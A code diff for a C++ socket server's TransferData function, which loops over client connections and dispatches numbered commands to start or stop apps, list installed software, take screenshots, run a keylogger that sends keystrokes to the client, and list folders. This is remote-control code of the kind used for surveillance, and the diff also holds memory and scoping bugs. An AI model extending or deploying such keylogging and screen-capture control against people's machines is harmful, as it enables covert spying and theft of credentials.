@@ -133,128 +133,130 @@ void serverFunction::TransferData()
 {
     char s[INET6_ADDRSTRLEN];
 
-    printf("server: waiting for connections...\n");
-    struct sockaddr_storage their_addr;
-    socklen_t sin_size = sizeof their_addr;
-    int new_fd = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size);
-    if (new_fd == -1)
-    {
-        perror("accept");
-    }
-
-    inet_ntop(their_addr.ss_family,
-              get_in_addr((struct sockaddr *)&their_addr),
-              s, sizeof s);
-    printf("server: got connection from %s\n", s);
-
-    while (1)
-    {
-        printf("\nClient: ");
-
-        int length = 100;
-        char *msg = (char *)malloc(length);
-        memset(msg , 0 , sizeof msg);
-
-        recv(new_fd, msg, length , 0);
-
-        // cout << msg << " " << strlen(msg) << "\n";
-
-        if (strcmp(msg, "exit") == 0)
+    while(1){
+        printf("server: waiting for connections...\n");
+        struct sockaddr_storage their_addr;
+        socklen_t sin_size = sizeof their_addr;
+        int new_fd = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size);
+        if (new_fd == -1)
         {
-            printf("exit\n");
-            free(msg);
-            break;
+            perror("accept");
         }
 
-        int maxLength = 100;
-        char *res = (char *)malloc(maxLength);
-        if (strcmp(msg, "1") == 0) // Start app
+        inet_ntop(their_addr.ss_family,
+                get_in_addr((struct sockaddr *)&their_addr),
+                s, sizeof s);
+        printf("server: got connection from %s\n", s);
+
+        while (1)
         {
+            printf("\nClient: ");
+
+            int length = 100;
+            char *msg = (char *)malloc(length);
             memset(msg , 0 , sizeof msg);
+
             recv(new_fd, msg, length , 0);
 
-            string temp(msg);
+            // cout << msg << " " << strlen(msg) << "\n";
 
-            cout << "Start app " << msg << "\n";
-            if (!startApp(res , temp))
+            if (strcmp(msg, "exit") == 0)
             {
-                strcpy(res, "fail to run the process\n");
+                printf("exit\n");
+                free(msg);
+                break;
             }
-            maxLength = strlen(res);
-        }
-        else if (strcmp(msg, "6") == 0) // Stop app
-        {
-            memset(msg , 0 , sizeof msg);
-            recv(new_fd, msg, length , 0);
 
-            string temp(msg);
+            int maxLength = 100;
+            char *res = (char *)malloc(maxLength);
+            if (strcmp(msg, "1") == 0) // Start app
+            {
+                memset(msg , 0 , sizeof msg);
+                recv(new_fd, msg, length , 0);
 
-            cout << "Stop app " << msg << "\n";
-            if (!stopApp(res , temp))
-            {
-                strcpy(res, "fail to run the process\n");
+                string temp(msg);
+
+                cout << "Start app " << msg << "\n";
+                if (!startApp(res , temp))
+                {
+                    strcpy(res, "fail to run the process\n");
+                }
+                maxLength = strlen(res);
             }
-            maxLength = strlen(res);
-        }
-        else if (strcmp(msg, "2") == 0) // InstalledApp
-        {
-            cout << "Get installed apps\n";
-            if (!getInstalledApp(res))
+            else if (strcmp(msg, "6") == 0) // Stop app
             {
-                strcpy(res, "fail to Get installed apps\n");
+                memset(msg , 0 , sizeof msg);
+                recv(new_fd, msg, length , 0);
+
+                string temp(msg);
+
+                cout << "Stop app " << msg << "\n";
+                if (!stopApp(res , temp))
+                {
+                    strcpy(res, "fail to run the process\n");
+                }
+                maxLength = strlen(res);
             }
-            maxLength = strlen(res);
-        }
-        else if (strcmp(msg, "3") == 0) // capture screen
-        {
-            cout << "Screen shot\n";
-            if (!ScreenShot(res , maxLength))
+            else if (strcmp(msg, "2") == 0) // InstalledApp
             {
-                strcpy(res, "fail to capture screen\n");
+                cout << "Get installed apps\n";
+                if (!getInstalledApp(res))
+                {
+                    strcpy(res, "fail to Get installed apps\n");
+                }
+                maxLength = strlen(res);
             }
-        }
-        else if (strcmp(msg, "4") == 0) // keylogger
-        {
-            cout << "Catching key pressed\n";
-            catchKeyPressUntilESC(new_fd);
+            else if (strcmp(msg, "3") == 0) // capture screen
+            {
+                cout << "Screen shot\n";
+                if (!ScreenShot(res , maxLength))
+                {
+                    strcpy(res, "fail to capture screen\n");
+                }
+            }
+            else if (strcmp(msg, "4") == 0) // keylogger
+            {
+                cout << "Catching key pressed\n";
+                catchKeyPressUntilESC(new_fd);
+                free(msg);
+                free(res);
+                continue;
+            }
+            else if (strcmp(msg, "5") == 0) // treeCommand
+            {
+                cout << "Folder tree\n";
+                char path[2] = ".";
+                if (!TreeCommand(path, res, maxLength))
+                {
+                    strcpy(res, "fail to browse the directory");
+                }
+                maxLength = strlen(res);
+        
+            }
+            else
+            {
+                fflush(stdin);
+                std::cout << "\n\t\t Server: Wrong command";
+
+                memset(res, 0, sizeof res);
+                strcpy(res, "Wrong command!!");
+                maxLength = strlen(res);
+            }
+
+            sending(new_fd, res , maxLength);
+
+            if (strcmp(res, "exit") == 0)
+            {
+                free(msg);
+                free(res);
+                break;
+            }
+            cout << "-------------------------------------------\n";
+
             free(msg);
             free(res);
-            continue;
         }
-        else if (strcmp(msg, "5") == 0) // treeCommand
-        {
-            cout << "Folder tree\n";
-            char path[2] = ".";
-            if (!TreeCommand(path, res, maxLength))
-            {
-                strcpy(res, "fail to browse the directory");
-            }
-            maxLength = strlen(res);
-     
-        }
-        else
-        {
-            fflush(stdin);
-            std::cout << "\n\t\t Server: Wrong command";
-
-            memset(res, 0, sizeof res);
-            strcpy(res, "Wrong command!!");
-            maxLength = strlen(res);
-        }
-
-        sending(new_fd, res , maxLength);
-
-        if (strcmp(res, "exit") == 0)
-        {
-            free(msg);
-            free(res);
-            break;
-        }
-        cout << "-------------------------------------------\n";
-
-        free(msg);
-        free(res);
-    }
+    
 
     if (!fork())
     {                  // this is the child process
@@ -265,6 +267,7 @@ void serverFunction::TransferData()
 
     printf("\nserver: disconnected from %s\n", s);
     close(new_fd);
+    }
 }
 
 serverFunction::~serverFunction()
